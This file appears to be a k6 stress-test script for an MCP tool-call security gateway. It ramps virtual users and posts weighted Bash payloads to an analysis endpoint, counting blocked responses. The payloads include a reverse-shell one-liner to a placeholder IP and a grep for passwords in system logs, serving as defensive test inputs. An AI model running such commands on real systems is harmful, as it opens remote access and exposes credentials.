// Stress Test for Proxilion MCP Gateway
//
// Purpose: Find the breaking point and maximum throughput
// Duration: 15 minutes
// VUs: Ramp from 10 to 500 concurrent users
//
// Run: k6 run loadtest/stress.js

import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend, Counter } from 'k6/metrics';

// Custom metrics
const errorRate = new Rate('errors');
const analysisDuration = new Trend('analysis_duration');
const requestsBlocked = new Counter('requests_blocked');

// Test configuration with stages
export const options = {
    stages: [
        { duration: '2m', target: 50 },    // Warm up to 50 users
        { duration: '3m', target: 100 },   // Increase to 100
        { duration: '3m', target: 200 },   // Increase to 200
        { duration: '3m', target: 300 },   // Increase to 300
        { duration: '2m', target: 500 },   // Push to 500
        { duration: '2m', target: 0 },     // Ramp down
    ],
    thresholds: {
        http_req_duration: ['p(95)<100'],  // Allow higher latency under stress
        errors: ['rate<0.05'],  // Allow up to 5% errors
    },
};

const BASE_URL = __ENV.TARGET_URL || 'http://localhost:8787';

// Mix of payloads with varying complexity
const payloads = [
    // Simple safe command (60% of traffic)
    {
        weight: 60,
        data: {
            tool_call: {
                Bash: {
                    command: 'ls -la',
                    args: [],
                    env: {},
                },
            },
            user_id: `user_${__VU}@company.com`,
            session_id: `stress_session_${__VU}`,
        },
    },
    // Medium complexity (25% of traffic)
    {
        weight: 25,
        data: {
            tool_call: {
                Bash: {
                    command: 'grep -r "password" /var/log/',
                    args: [],
                    env: {},
                },
            },
            user_id: `user_${__VU}@company.com`,
            session_id: `stress_session_${__VU}`,
        },
    },
    // High threat (15% of traffic)
    {
        weight: 15,
        data: {
            tool_call: {
                Bash: {
                    command: 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
                    args: [],
                    env: {},
                },
            },
            user_id: `user_${__VU}@company.com`,
            session_id: `stress_session_${__VU}`,
        },
    },
];

function selectPayload() {
    const rand = Math.random() * 100;
    let cumulative = 0;
    for (const p of payloads) {
        cumulative += p.weight;
        if (rand < cumulative) {
            return p.data;
        }
    }
    return payloads[0].data;
}

export default function () {
    const payload = selectPayload();
    const startTime = new Date();

    const response = http.post(
        `${BASE_URL}/analyze`,
        JSON.stringify(payload),
        {
            headers: {
                'Content-Type': 'application/json',
            },
            timeout: '10s',
        }
    );

    const duration = new Date() - startTime;
    analysisDuration.add(duration);

    // Check response
    const success = check(response, {
        'status is 200 or 403': (r) => r.status === 200 || r.status === 403,
        'response time < 500ms': (r) => r.timings.duration < 500,
    });

    // Track blocked requests
    if (response.status === 403) {
        requestsBlocked.add(1);
    }

    errorRate.add(!success);

    // Minimal sleep under stress
    sleep(0.01);
}

export function setup() {
    const healthResponse = http.get(`${BASE_URL}/health`);
    if (healthResponse.status !== 200) {
        throw new Error('Gateway is not healthy. Aborting stress test.');
    }
    console.log('Starting stress test - ramping to 500 VUs over 15 minutes');
}

export function teardown(data) {
    console.log('Stress test completed. Check metrics for breaking point.');
}
